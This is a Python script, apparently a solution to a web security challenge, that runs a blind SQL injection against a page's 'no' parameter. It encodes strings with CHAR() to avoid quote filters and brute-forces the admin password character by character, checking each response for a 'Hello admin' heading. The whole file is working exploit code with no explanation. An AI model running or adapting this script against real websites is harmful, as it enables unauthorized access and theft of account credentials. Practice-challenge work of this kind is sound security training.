import requests
from bs4 import BeautifulSoup
import string

# Generate the string from 0 to Z
all_characters = string.digits + string.ascii_letters

url       = input("Enter the challenge URL     : ")
# Get PHPSESSID from console input
phpsessid = input("Enter the value of PHPSESSID: ")
cookies = {"PHPSESSID": phpsessid}
base_query = "' || id like 'admin' && pw like '{}%'-- -"
base_query = "0 or id like {} and pw like {} -- -"

def encode_as_char_func(s: str) -> str:
    as_b10 = [str(ord(ch)) for ch in s]
    return f"CHAR({','.join(as_b10)} using utf8mb4)"

def is_correct(response: requests.Response) -> bool:
    soup = BeautifulSoup(response.content, "html.parser")
    return bool(soup.find("h2", string="Hello admin"))

def generate_query_params(user, pw):
    return {"no": base_query.format(
        encode_as_char_func(user), 
        encode_as_char_func(pw)
    )}

user = 'admin'
pw = ''
while True:
    found_char = False
    for char in all_characters:
        candidate_pass = pw + char
        print(f"Trying {candidate_pass}")
        response = requests.get(url, cookies=cookies, params=generate_query_params(user, candidate_pass + '%'))
        if is_correct(response):
            pw = candidate_pass
            print(f"Found correct  : {char}")
            print(f"Password so far: {candidate_pass}")
            found_char = True
            break
    if not found_char:
        if pw == '':
            print("No Password Found")
        else:
            print(f"Password: {pw}")
        break